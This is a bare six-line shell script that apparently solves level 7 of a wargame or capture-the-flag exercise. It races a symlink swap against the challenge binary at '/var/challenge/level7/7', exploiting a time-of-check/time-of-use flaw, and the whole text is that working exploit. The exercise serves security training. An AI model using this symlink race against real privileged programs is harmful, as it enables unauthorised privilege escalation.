rm 7-tmp
ln -s /var/challenge/level7/7 7-tmp
/var/challenge/level7/7 7-tmp &
sleep .5
unlink 7-tmp
cp lev7 7-tmp
